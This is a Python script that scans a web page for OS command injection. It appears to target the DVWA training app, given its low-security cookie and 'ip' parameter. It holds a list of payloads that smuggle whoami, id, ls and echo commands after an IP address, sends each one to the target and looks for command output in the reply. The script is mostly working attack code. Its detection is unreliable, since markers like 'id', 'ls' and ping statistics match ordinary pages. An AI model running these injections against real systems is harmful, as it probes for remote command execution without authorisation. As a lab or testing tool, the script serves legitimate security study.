import sys
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import logging
import json

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(message)s')  # Only show essential logs
logger = logging.getLogger()

# Session setup
session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
session.headers["Cookie"] = "security=low; PHPSESSID=34b5af50db2e943348f0581af7f98498"  # Replace with your session ID

# Default Command Execution payloads
command_payload_list = [
    "8.8.8.8;whoami",  # Command chaining
    "8.8.8.8|whoami",  # Pipe operator
    "8.8.8.8`whoami`",  # Backticks
    "8.8.8.8$(whoami)",  # Subshell
    "8.8.8.8;id",  # Command chaining
    "8.8.8.8|id",  # Pipe operator
    "8.8.8.8`id`",  # Backticks
    "8.8.8.8$(id)",  # Subshell
    "8.8.8.8;ls",  # Command chaining
    "8.8.8.8|ls",  # Pipe operator
    "8.8.8.8`ls`",  # Backticks
    "8.8.8.8$(ls)",  # Subshell
    "8.8.8.8;echo vulnerable",  # Command chaining
    "8.8.8.8|echo vulnerable",  # Pipe operator
    "8.8.8.8`echo vulnerable`",  # Backticks
    "8.8.8.8$(echo vulnerable)",  # Subshell
]

def get_forms(url):
    """Extract all forms from the given URL."""
    try:
        response = session.get(url)
        response.raise_for_status()  # Raise an exception for HTTP errors
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all("form")
    except Exception as e:
        logger.error(f"Error fetching forms from {url}: {e}")
        return []

def form_details(form):
    """Extract details of a form."""
    details = {}
    try:
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = [{"type": input_tag.attrs.get("type", "text"), 
                   "name": input_tag.attrs.get("name"), 
                   "value": input_tag.attrs.get("value", "")} 
                  for input_tag in form.find_all("input")]
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
    except Exception as e:
        logger.error(f"Error extracting form details: {e}")
        details["action"] = "#"
        details["method"] = "get"
        details["inputs"] = [{"type": "text", "name": "test", "value": ""}]
    return details

def submit_form(details, url, payload=""):
    """Submit a form with the given payload."""
    try:
        target_url = urljoin(url, details["action"])
        data = {input_tag["name"]: input_tag["value"] + payload if input_tag["type"] != "submit" else input_tag["value"] 
                for input_tag in details["inputs"]}
        logger.info(f"Submitting form to {target_url} with data: {data}")
        if details["method"] == "post":
            response = session.post(target_url, data=data)
        else:
            response = session.get(target_url, params=data)
        logger.info(f"Received response: {response.status_code}, Content: {response.text[:500]}")  # Log first 500 chars
        return response
    except Exception as e:
        logger.error(f"Error submitting form: {e}")
        return None

def command_exec_vulnerable(response, payload):
    """Check if the payload executed a system command."""
    if not response:
        return False
    content = response.text.lower()
    indicators = [
        "root", "uid=", "gid=", "directory listing", "file list",
        "vulnerable", "whoami", "id", "ls", "/etc/passwd",
        "ping statistics", "packets transmitted", "rtt"  # Indicators for ping command
    ]
    # Check if any indicator is present in the response
    return any(indicator in content for indicator in indicators)

def command_exec_scan(url):
    """Scan the given URL for command execution vulnerabilities."""
    found_vulnerabilities = []
    # Test query parameters
    for payload in command_payload_list:
        modified_url = f"{url}?ip={payload}"  # Append payload to query string
        logger.info(f"Testing URL: {modified_url}")
        response = session.get(modified_url)
        if command_exec_vulnerable(response, payload):
            found_vulnerabilities.append({
                "status": "vulnerable",
                "payload": payload,
                "type": "Command Execution"
            })
    return found_vulnerabilities if found_vulnerabilities else [{"status": "not vulnerable", "payload": "", "type": "Command Execution"}]

if __name__ == "__main__":
    try:
        base_url = sys.argv[1]
        result = command_exec_scan(base_url)
        # Clean output, only showing status and payload
        clean_result = [{"status": vuln["status"], "payload": str(vuln.get("payload", "")), "type": vuln["type"]} 
                        for vuln in result]
        # Show final result as JSON
        print(json.dumps(clean_result, indent=4))
    except Exception as e:
        print(json.dumps({"error": str(e)}))